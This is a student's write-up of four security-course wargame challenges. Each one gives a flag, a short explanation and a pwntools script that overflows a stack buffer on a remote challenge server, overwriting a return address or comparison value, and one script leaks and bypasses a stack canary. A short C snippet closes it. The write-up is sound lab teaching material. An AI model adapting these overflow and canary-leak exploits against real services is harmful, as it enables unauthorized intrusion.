# challenge-name: jump

## Flag
FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1qdW1wIiwiaXAiOiIxMjQuMTgzLjE5LjE1MyIsInNlc3Npb24iOiI5ZmJlOWU0NS04NGEyLTRmNTYtOGEzYS1lZGEyZDM0MzQ4NTYifQ.M8yik1YxerCti0ISSrdJN9mCeG2WIdi-Ja7ECdbWz-g}

## General overview
We just need to override the pointer variable above the buffer.

## Program used
```python
from pwn import *
from pwnlib.util.packing import p32, u32

p = remote('comp6447.wtf', 28958)

offset = 64
winAddr = 0x08048536

payload = "A".encode() * offset + p32(winAddr)

p.sendline(payload)
p.sendline("cat flag")

p.interactive()
p.close()
```

======================================================

# challenge-name: blind

## Flag
FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1ibGluZCIsImlwIjoiMTI0LjE4My4xOS4xNTMiLCJzZXNzaW9uIjoiYmVmODYzNGEtZjY3Zi00MzgyLThiZTAtNGM2MWU2ZTA2ZmI4In0.nSFh8C3VKOfUQVFr3mz1tpv-Uid5xZxGbIIyNWWIthE}

## General overview
By binary ninja we know that we need to jump to the win function, so we can just overwrite the return address of the vuln function.

## Program used
```python
from pwn import *
from pwnlib.util.packing import p32, u32

p = remote('comp6447.wtf', 28872)
elf = ELF('./wargame2/blind')

offset = 72

payload = "A".encode() * offset + p32(elf.symbols['win'])

p.sendline(payload)
p.sendline("cat flag")

p.interactive()
p.close()
```
======================================================

# challenge-name: bestsecurity

## Flag
FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1iZXN0c2VjdXJpdHkiLCJpcCI6IjEyNC4xODMuMTkuMTUzIiwic2Vzc2lvbiI6IjhmYjVkODdhLTE2YzgtNGMyMC1iNzNiLWRhOTM0OTZmNGNiMiJ9.735lYOCvbZgjM5SxLjqA6ugB8NWr42hsvkdSlBLVsMQ}

## General overview
The challenge is simple, check the check_canary function with Binary Ninja. We can then see that the key is to break the strncmp, and we just need to overflow and rewrite the string being compared. Using the hexadecimal number given by Binary Ninja will give us the number of bits we need to rewrite.
137 - 9 = 128

## Program used
```python
from pwn import *
from pwnlib.util.packing import p32, u32

p = remote('comp6447.wtf', 26949)

# 137 - 9 = 128
offset = 128

payload = "A".encode() * offset + bytes('1234', 'utf-8')

p.sendline(payload)
p.sendline("cat flag")

p.interactive()
p.close()
```

======================================================

# challenge-name: stack-dump	

## Flag
FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1zdGFjay1kdW1wIiwiaXAiOiIxMjQuMTgzLjE5LjE1MyIsInNlc3Npb24iOiI3OWFmZGE3NC1hZWEyLTQzOGUtOTlhZS1mMWYzZTBkYTRiNWQifQ.VRdQF7eqaikOS07Cnj0VXQHUKlXQ9T-3K1ZIcGa48hY}

## General overview
There is a canary in the stack, and we need to use the "dump memory" option provided by the program to steal this secret. By using the hexadecimal number that the binary ninja tells us, we can calculate the offset between stack pointer and canary.
Then we calculate the number of fills between them and finally rewrite the return address to the address of the win function and we're done!


## Program used
```python
from pwn import *
from pwnlib.util.packing import p32

p = remote('comp6447.wtf', 24973)
elf = ELF('./wargame2/stack-dump')


p.recvuntil(b'pointer ', drop=True)
# ebp-0x71 contains stack pointer at the beginning
# ebp-0x8 contains stack canary value
stk_ptr = p32(int(p.recvline(), 16) + 0x71 - 0x8)
log.info(f"The stack pointer is {stk_ptr}")

p.recvuntil(b'quit', drop=True)
p.sendline(b"a")

p.recvuntil(b'len: ', drop=True)
p.sendline(stk_ptr)

p.recvuntil(b'quit', drop=True)
p.sendline(b'b')

p.recvline()
canary = p.recvline()
canary = canary[22:26]
log.info(f"Canary: {canary}")

p.recvuntil(b'quit', drop=True)
p.sendline(b"a")

# The distance from the input to the return address is 108 bytes
# padding + canary + padding + return address
payload = b'A'*96 + canary + b'A'*8 + p32(elf.symbols['win'])
p.sendline(payload)

p.recvuntil(b'quit', drop=True)
p.sendline(b'd')

p.sendline(b"cat flag")

p.interactive()
p.close()

```

======================================================

# challenge-name: Reverse engineering

## Code
```c
int main(int argc, char const *argv[]) {
    int number;
    int i = scanf("%d", &number)
    if (number != 1337) puts("Bye");
    else puts("Your so leet!");
    return 1;
} 
```